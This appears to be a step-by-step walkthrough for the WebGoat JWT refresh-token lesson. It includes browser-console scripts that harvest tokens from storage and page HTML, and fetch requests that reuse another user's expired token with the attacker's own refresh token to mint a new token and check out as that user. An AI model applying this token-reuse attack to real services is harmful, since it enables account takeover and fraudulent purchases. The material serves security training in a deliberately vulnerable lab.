@@ -1,0 +1,355 @@
+╔═══════════════════════════════════════════════════════════╗
+║             JWT REFRESH TOKEN ATTACK - ULTIMATE           ║
+║                    STEP-BY-STEP GUIDE                     ║
+╚═══════════════════════════════════════════════════════════╝
+
+⚠️ IF SECTION 2 "DOES NOTHING" - THIS FILE FIXES IT!
+
+═══════════════════════════════════════════════════════════
+🎯 THE PROBLEM:
+═══════════════════════════════════════════════════════════
+
+When you paste Section 2, you see NO OUTPUT at all.
+This means one of these is happening:
+1. The script has a syntax error (browser shows error in red)
+2. The script runs but exits early (checks fail silently)
+3. The script is async and you don't see progress
+
+═══════════════════════════════════════════════════════════
+✅ THE SOLUTION: USE THE ULTRA DEBUG VERSION!
+═══════════════════════════════════════════════════════════
+
+Use the file: jwt_refresh_ULTRA_DEBUG.js
+
+This version shows EVERY STEP with colored output:
+- ✓ Shows when execution starts (purple message)
+- ✓ Shows each check step-by-step
+- ✓ Shows exact reason if something fails
+- ✓ Shows the request being sent
+- ✓ Shows the response data
+- ✓ Shows success/failure clearly
+
+═══════════════════════════════════════════════════════════
+📋 STEP 1: FIND YOUR REFRESH TOKEN
+═══════════════════════════════════════════════════════════
+
+Open Browser Console (F12) on the WebGoat lesson page, paste:
+
+(function() {
+    console.log('%c🔍 FINDING YOUR REFRESH TOKEN...', 'color: cyan; font-size: 16px; font-weight: bold');
+    
+    // Check localStorage
+    console.log('\n[1/3] Checking localStorage...');
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        console.log(`  ${key}: ${value ? value.substring(0, 50) + '...' : '(empty)'}`);
+        if (key.toLowerCase().includes('refresh')) {
+            console.log(`  ⭐ FOUND! Set with: window.myRefreshToken = localStorage.getItem("${key}");`);
+        }
+    }
+    
+    // Check sessionStorage
+    console.log('\n[2/3] Checking sessionStorage...');
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        const value = sessionStorage.getItem(key);
+        console.log(`  ${key}: ${value ? value.substring(0, 50) + '...' : '(empty)'}`);
+        if (key.toLowerCase().includes('refresh')) {
+            console.log(`  ⭐ FOUND! Set with: window.myRefreshToken = sessionStorage.getItem("${key}");`);
+        }
+    }
+    
+    // Check page HTML
+    console.log('\n[3/3] Checking page HTML...');
+    const html = document.documentElement.innerHTML;
+    const match = html.match(/refresh_token["']?\s*[:=]\s*["']?([a-zA-Z0-9\-_.]+)/i);
+    if (match) {
+        console.log(`  ⭐ FOUND in HTML: ${match[1].substring(0, 50)}...`);
+        console.log(`  Set with: window.myRefreshToken = "${match[1]}";`);
+    } else {
+        console.log('  Not found in HTML');
+    }
+    
+    // Try to get from server
+    console.log('\n[TRYING TO GET FROM SERVER...]');
+    console.log('Looking for buttons on the page...');
+    const buttons = document.querySelectorAll('button');
+    buttons.forEach((btn, i) => {
+        const text = btn.textContent || btn.value || '';
+        if (text) console.log(`  [${i}] ${text}`);
+    });
+    console.log('\n💡 TIP: Click a "Login" or "Get Token" button');
+    console.log('Then check Network tab (F12) for the response!');
+})();
+
+✅ YOU SHOULD SEE:
+   - List of localStorage items
+   - List of sessionStorage items
+   - HTML search results
+   - List of buttons on the page
+
+⚠️ IF YOU SEE "FOUND!", copy the command to set window.myRefreshToken
+
+═══════════════════════════════════════════════════════════
+📋 STEP 2: RUN ULTRA DEBUG SECTION 1
+═══════════════════════════════════════════════════════════
+
+Open jwt_refresh_ULTRA_DEBUG.js and copy SECTION 1, paste in console.
+
+✅ YOU SHOULD SEE (immediately):
+   ════════════════════════════════════════
+   [SECTION 1] SETUP STARTING...
+   ════════════════════════════════════════
+   ✓ Tom's token saved to window.TOMS_EXPIRED
+   Token length: 214
+   ✅ SECTION 1 COMPLETE!
+   
+   ⚠️ NOW DO THIS:
+   window.myRefreshToken = "YOUR_ACTUAL_TOKEN_HERE";
+
+⚠️ IF YOU SEE NOTHING:
+   1. Check for RED error messages in console
+   2. Make sure you copied the ENTIRE section including (function() {
+   3. Make sure you pressed Enter after pasting
+
+═══════════════════════════════════════════════════════════
+📋 STEP 3: SET YOUR REFRESH TOKEN
+═══════════════════════════════════════════════════════════
+
+In the console, type (replace with your actual token):
+
+window.myRefreshToken = "your_actual_refresh_token_here";
+
+Press Enter.
+
+✅ TO VERIFY IT'S SET:
+   Type: window.myRefreshToken
+   Press Enter
+   You should see your token value
+
+═══════════════════════════════════════════════════════════
+📋 STEP 4: RUN ULTRA DEBUG SECTION 2
+═══════════════════════════════════════════════════════════
+
+Copy SECTION 2 from jwt_refresh_ULTRA_DEBUG.js, paste in console.
+
+✅ YOU SHOULD SEE (immediately):
+   ════════════════════════════════════════
+   [SECTION 2] ATTACK STARTING...
+   ════════════════════════════════════════
+   🔍 Section 2 is executing RIGHT NOW!
+   
+   [CHECK 1/2] Checking Tom's token...
+   typeof window.TOMS_EXPIRED: string
+   ✓ PASS: Tom's token exists
+   
+   [CHECK 2/2] Checking your refresh token...
+   typeof window.myRefreshToken: string
+   ✓ PASS: Your refresh token exists
+   
+   [PREPARING REQUEST]
+   URL: http://192.168.254.112:8001/WebGoat/JWT/refresh/newToken
+   
+   [SENDING REQUEST]
+   ⏳ Waiting for response...
+   
+   [RESPONSE RECEIVED]
+   Status: 200 OK
+   
+   [PARSING RESPONSE]
+   Response data: {access_token: "eyJ..."}
+   ✓ Found access_token!
+   
+   [SAVING TOKEN]
+   ✓ Saved to window.tomsNewToken
+   
+   [VERIFYING TOKEN]
+   Decoded payload: {user: "Tom", ...}
+   
+   ╔════════════════════════════════════╗
+   ║   ✅ SUCCESS! GOT TOM'S TOKEN!   ║
+   ╚════════════════════════════════════╝
+   
+   🚀 NOW RUN SECTION 3 TO CHECKOUT!
+
+⚠️ IF YOU SEE NOTHING:
+   1. Look for RED errors in console
+   2. Check if checks fail (will show ❌ FAIL message)
+   3. Make sure window.myRefreshToken is set
+   4. Try running FIND_REFRESH_TOKEN.js again
+
+⚠️ IF YOU SEE "❌ FAIL: Your refresh token not set!":
+   - Go back to STEP 3
+   - Set window.myRefreshToken = "your_token"
+   - Then re-run SECTION 2
+
+⚠️ IF YOU SEE "❌ REQUEST FAILED! Status: 401":
+   - The refresh token might be wrong
+   - Try getting a fresh one from the server
+   - Click buttons on the lesson page
+   - Check Network tab for new tokens
+
+⚠️ IF YOU SEE "❌ REQUEST FAILED! Status: 500":
+   - Check the response body in the output
+   - Might be a server-side error
+   - Try refreshing the lesson page
+
+═══════════════════════════════════════════════════════════
+📋 STEP 5: RUN ULTRA DEBUG SECTION 3
+═══════════════════════════════════════════════════════════
+
+Copy SECTION 3 from jwt_refresh_ULTRA_DEBUG.js, paste in console.
+
+✅ YOU SHOULD SEE:
+   ════════════════════════════════════════
+   [SECTION 3] CHECKOUT STARTING...
+   ════════════════════════════════════════
+   🔍 Section 3 is executing RIGHT NOW!
+   
+   [CHECK] Checking if Tom's new token exists...
+   ✓ PASS: Tom's new token exists
+   
+   [PREPARING CHECKOUT]
+   URL: http://192.168.254.112:8001/WebGoat/JWT/refresh/checkout
+   
+   [SENDING CHECKOUT REQUEST]
+   ⏳ Waiting for response...
+   
+   [CHECKOUT RESPONSE RECEIVED]
+   Status: 200 OK
+   
+   [CHECKOUT RESULT]
+   Response data: {lessonCompleted: true, ...}
+   
+   ╔════════════════════════════════════════════════╗
+   ║  🎉 CHALLENGE COMPLETE! TOM PAID FOR BOOKS!  ║
+   ╚════════════════════════════════════════════════╝
+   
+   🏆 JWT REFRESH TOKEN ATTACK SUCCESSFUL!
+
+═══════════════════════════════════════════════════════════
+❓ TROUBLESHOOTING: "NOTHING HAPPENS" WHEN PASTING
+═══════════════════════════════════════════════════════════
+
+If you paste a section and see ABSOLUTELY NOTHING (not even an error):
+
+1. CHECK FOR SYNTAX ERRORS:
+   - Look at the console - any RED messages?
+   - Try pasting just the first line: (function() {
+   - If that shows an error, the script is broken
+
+2. CHECK IF CONSOLE IS FROZEN:
+   - Press Ctrl+L to clear console
+   - Type: console.log("test")
+   - Press Enter
+   - If you don't see "test", your console is broken
+
+3. CHECK IF SCRIPT IS TOO LONG:
+   - Some browsers have paste limits
+   - Solution: Use the script files instead
+   - Or paste smaller sections
+
+4. VERIFY YOU'RE ON THE RIGHT PAGE:
+   - URL should be: http://192.168.254.112:8001/WebGoat/JWT
+   - You should see "Refreshing a token" lesson
+   - If you're on a different page, the scripts won't work
+
+5. TRY A SIMPLER TEST:
+   Paste this simple test:
+   
+   (function() {
+       console.log('%c🎯 TEST SUCCESSFUL!', 'color: green; font-size: 20px; font-weight: bold');
+       console.log('If you see this, your console is working!');
+       console.log('Now try the actual scripts.');
+   })();
+   
+   If you see "TEST SUCCESSFUL!", the console works.
+   If not, your browser console might be broken.
+
+═══════════════════════════════════════════════════════════
+🎁 BONUS: ONE-LINER TO GET REFRESH TOKEN FROM SERVER
+═══════════════════════════════════════════════════════════
+
+Paste this to try getting a refresh token directly:
+
+fetch("/WebGoat/JWT/refresh/login", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({user: "Jerry"})}).then(r => r.json()).then(d => {console.log("Response:", d); if(d.refresh_token) {window.myRefreshToken = d.refresh_token; console.log("%c✅ Got refresh token!", "color: green; font-weight: bold"); console.log("Set to: window.myRefreshToken");} else {console.log("%c⚠️ No refresh_token in response", "color: orange");}});
+
+⚠️ This might fail with 401 if the endpoint needs initialization.
+   In that case, click buttons on the lesson page first.
+
+═══════════════════════════════════════════════════════════
+📁 FILES TO USE:
+═══════════════════════════════════════════════════════════
+
+✅ BEST: jwt_refresh_ULTRA_DEBUG.js
+   - Shows MAXIMUM detail
+   - Every step has output
+   - Easy to see what's happening
+   - Easy to debug issues
+
+✅ ALSO GOOD: jwt_refresh_GUARANTEED_OUTPUT.js
+   - Similar to ULTRA_DEBUG
+   - Slightly less verbose
+
+✅ FOR FINDING TOKEN: FIND_REFRESH_TOKEN.js
+   - Searches everywhere for refresh token
+   - Tries multiple methods
+   - Shows detailed results
+
+═══════════════════════════════════════════════════════════
+🆘 STILL STUCK? MANUAL VERIFICATION:
+═══════════════════════════════════════════════════════════
+
+If automated scripts don't work, verify manually:
+
+1. VERIFY TOM'S TOKEN IS SET:
+   console.log(window.TOMS_EXPIRED);
+   
+   Should show: eyJhbGciOiJIUzUxMiJ9.eyJpYXQi...
+
+2. VERIFY YOUR REFRESH TOKEN IS SET:
+   console.log(window.myRefreshToken);
+   
+   Should show: your actual refresh token
+
+3. MANUAL REQUEST:
+   fetch('/WebGoat/JWT/refresh/newToken', {
+       method: 'POST',
+       headers: {
+           'Authorization': 'Bearer ' + window.TOMS_EXPIRED,
+           'Content-Type': 'application/json'
+       },
+       body: JSON.stringify({refresh_token: window.myRefreshToken})
+   }).then(r => r.json()).then(d => {
+       console.log('Response:', d);
+       if (d.access_token) {
+           window.tomsNewToken = d.access_token;
+           console.log('✅ Got Tom\'s new token!');
+       }
+   });
+
+4. MANUAL CHECKOUT:
+   fetch('/WebGoat/JWT/refresh/checkout', {
+       method: 'POST',
+       headers: {
+           'Authorization': 'Bearer ' + window.tomsNewToken,
+           'Content-Type': 'application/json'
+       }
+   }).then(r => r.json()).then(d => {
+       console.log('Checkout result:', d);
+   });
+
+═══════════════════════════════════════════════════════════
+✅ SUCCESS CHECKLIST:
+═══════════════════════════════════════════════════════════
+
+□ Found your refresh token
+□ Set window.myRefreshToken = "..."
+□ Ran SECTION 1 → Saw "SECTION 1 COMPLETE!"
+□ Ran SECTION 2 → Saw "SUCCESS! GOT TOM'S TOKEN!"
+□ Ran SECTION 3 → Saw "CHALLENGE COMPLETE!"
+□ WebGoat shows green checkmark on lesson
+□ Tom paid $31.53 for books! 🎉
+
+═══════════════════════════════════════════════════════════
